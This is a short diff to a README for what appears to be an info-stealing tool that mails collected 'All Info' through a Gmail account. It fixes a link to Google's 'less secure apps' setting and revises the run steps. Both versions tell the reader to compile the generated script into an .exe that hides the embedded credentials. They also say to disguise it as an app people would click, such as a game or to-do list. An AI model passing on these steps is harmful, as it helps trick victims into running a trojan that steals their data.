@@ -26,8 +26,8 @@
 -a   All Info
 ```
 
-### [Enable less secured apps for your Google account]: https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4M_yzUBbTlqrssoE3FTb1-fJ91s9LkQtfU3gfzS7_kk7m--nFj-KFozf-ptYPMZE5kl4HS0WwThaDpZLsbg1l0VuV6cBQ and enable less secure apps for your account
+### [Enable less secured apps for your Google account](https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4M_yzUBbTlqrssoE3FTb1-fJ91s9LkQtfU3gfzS7_kk7m--nFj-KFozf-ptYPMZE5kl4HS0WwThaDpZLsbg1l0VuV6cBQ)
 ### Then, run `generate.py`.  
 #
-# Last step
 ### Now, you would probably want to convert the `generated.py` to a `.exe` so that people wont see your personal email and password, and code the rest of `generated.py` to be an app that anybody would click. (Rock paper scissors game, todolist....) possibilities are obviously endless.
+### Finally, run generated.py
